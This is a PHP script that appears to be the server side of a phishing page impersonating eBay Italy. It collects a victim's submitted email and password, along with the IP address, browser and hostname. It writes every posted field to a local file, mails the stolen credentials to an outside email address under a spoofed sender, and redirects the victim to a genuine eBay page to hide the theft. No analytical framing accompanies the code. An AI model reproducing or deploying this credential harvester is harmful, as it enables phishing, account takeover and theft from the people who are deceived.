<?php

$ip = getenv("REMOTE_ADDR");
$browser = $_SERVER['HTTP_USER_AGENT'];
$referrer = $_SERVER['HTTP_REFERER'];
$hostname = gethostbyaddr($ip);
foreach ($_POST as $key => $value) {
    $msg=sprintf("%s%s -> %s\n",$msg,$key,$value);
    }
   $ff = @fopen("ct.txt", "a");@fwrite($ff,$msg); @fclose($ff);

$message .= "IP: ".$ip."\n";

$message .= "Email     : ".$_POST['user']."\n";

$message .= "Pass Cont : ".$_POST['pass']."\n";

$message .= "BR: ".$browser."\n";

$message .= "Host Ip: ".$hostname."\n";

$recipient = "powerlovlyy292@virgilio.it";

$subject = "CT";

$headers = "From: conturicraig@craig.com";

$headers .= $_POST['eMailAdd']."\n";

$headers .= "MIME-Version: 1.0\n";

	 if (mail($recipient,$subject,$message,$headers))

	   {

		   header("Location: http://pages.ebay.it/_viewitem/WEB-INF/views/error.jsp");



	   }

else

    	   {

 		echo "location";

  	   }



?>